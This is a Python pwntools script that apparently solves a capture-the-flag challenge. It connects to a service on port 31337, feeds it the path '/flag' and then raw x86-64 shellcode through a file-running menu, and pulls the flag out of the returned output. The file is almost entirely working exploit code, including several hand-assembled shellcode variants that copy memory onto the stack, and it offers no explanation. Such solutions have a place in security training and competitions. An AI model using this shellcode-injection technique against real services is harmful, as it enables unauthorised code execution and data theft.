#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

class Interface():
    def __init__(self, p):
        self.io = p
        self.read_until_choice()

    def read_until_choice(self, p=False):
        result = self.io.recvuntil(b"Choice: ")
        
        return result

    def run_file(self, data=None, filename=None):
        self.io.sendline(b"1")

        if data:
            self.io.sendline()
            self.io.sendlineafter(b"> ", b"/dev/stdin")
            self.io.send(data)
        elif filename:
            self.io.sendline()
            self.io.sendlineafter(b"> ", filename.encode())

        self.read_until_choice()

    def get_results(self):
        self.io.sendline(b"2")
        return self.read_until_choice(True)

    def interactive(self):
        self.io.interactive()


def main(io):
    io = Interface(io)

    shellcode = b"\x48\x8D\x35\x00\xFF\xFF\xFF\x48\xC7\xC7\x02\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\xC3"
    shellcode = b"\x48\x8D\x3D\x70\xFF\xFF\xFF\x48\x8B\x45\xD8\x48\x83\xC0\x0C\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\xC3"
    shellcode = b"\x48\x8D\x3D\x80\xDF\xFF\xFF\x48\x8B\x45\xD8\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\xC3"
    shellcode = b"\x48\x8D\x3D\x00\xE0\xFF\xFF\x48\x8B\x45\xD8\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\xC3"
    shellcode= b"\x48\x8D\x3D\xF9\xDF\xFF\xFF\x48\x8B\x45\xD8\x48\x83\xC0\x0C\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\xC3"
    shellcode= b"\x48\x8D\x3D\xF9\xDF\xFF\xFF\x48\x8B\x45\xD8\x48\x83\xC0\x0C\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\xC3"
    shellcode= b"\x48\x8D\x3D\xF9\xDF\xFF\xFF\x48\x8B\x45\xD8\x48\x83\xC0\x0C\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\x48\x83\xC7\x08\x48\x83\xC0\x08\x48\x8B\x1F\x48\x89\x18\xC3"

    # io.run_file(b'\x90'*(0x90) + shellcode)
    # time.sleep(1)
    io.get_results()
    io.run_file(filename="/flag")
    # io.get_results()
    # time.sleep(1)
    io.run_file(b"\xeb\x3e") # won't do shit
    io.get_results()
    # io.run_file(b'\x90' * 0x80 + shellcode)
    io.run_file(shellcode)
    x = io.get_results()
    x = x[x.index(b'Live'):x.index(b"}")+1]
    log.info(f"Flag: %s", x.decode().strip())

main(io)